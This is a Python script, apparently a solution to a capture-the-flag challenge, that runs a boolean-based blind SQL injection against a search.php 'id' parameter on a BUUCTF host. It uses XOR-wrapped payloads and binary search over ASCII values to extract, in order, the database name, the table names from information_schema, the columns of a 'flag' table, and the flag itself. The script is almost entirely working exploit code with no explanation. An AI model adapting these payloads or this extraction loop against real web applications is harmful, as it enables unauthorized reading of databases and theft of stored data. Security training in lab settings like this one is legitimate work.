#!/usr/bin/env python3
import requests
import time

url = "http://0a24f8a2-89ab-4896-b827-a4e6d5660cda.node5.buuoj.cn:81/search.php"

def check(payload):
    """返回 True 表示条件为真(页面正常), False 表示条件为假(ERROR)"""
    try:
        r = requests.get(url, params={"id": payload}, timeout=10)
        return "ERROR" not in r.text and "Error" not in r.text
    except:
        return False

def binary_search(query, max_val=128):
    """二分查找字符值"""
    low, high = 0, max_val
    while low < high:
        mid = (low + high) // 2
        payload = f"1^(({query})>{mid})"
        if check(payload):
            low = mid + 1
        else:
            high = mid
    return low if low > 0 else 0

def get_length(query):
    """获取长度"""
    for i in range(1, 100):
        payload = f"1^(({query})={i})"
        if check(payload):
            return i
    return 0

# 先测试基本功能
print("[*] Testing basic injection...")
print(f"    1^(1=1) -> {check('1^(1=1)')}")  # False (1^1=0 -> ERROR)
print(f"    1^(1=0) -> {check('1^(1=0)')}")  # True (1^0=1 -> 正常)

# 获取数据库名
print("\n[*] Getting database name...")
db_len = get_length("length(database())")
print(f"    Database length: {db_len}")
db_name = ""
for i in range(1, db_len + 1):
    c = binary_search(f"ascii(substr(database(),{i},1))")
    db_name += chr(c)
    print(f"    Database: {db_name}")

# 获取表名
print("\n[*] Getting table names...")
table_query = "(select group_concat(table_name) from information_schema.tables where table_schema=database())"
table_len = get_length(f"length({table_query})")
print(f"    Tables length: {table_len}")
tables = ""
for i in range(1, table_len + 1):
    c = binary_search(f"ascii(substr({table_query},{i},1))")
    tables += chr(c)
    print(f"    Tables: {tables}")

# 获取 flag 表的列名
print("\n[*] Getting columns of flag table...")
col_query = "(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag')"
col_len = get_length(f"length({col_query})")
print(f"    Columns length: {col_len}")
cols = ""
for i in range(1, col_len + 1):
    c = binary_search(f"ascii(substr({col_query},{i},1))")
    cols += chr(c)
    print(f"    Columns: {cols}")

# 获取 flag
print("\n[*] Getting flag...")
flag_query = "(select flag from flag)"
flag_len = get_length(f"length({flag_query})")
print(f"    Flag length: {flag_len}")
flag = ""
for i in range(1, flag_len + 1):
    c = binary_search(f"ascii(substr({flag_query},{i},1))")
    flag += chr(c)
    print(f"    Flag: {flag}")

print(f"\n[+] Final flag: {flag}")
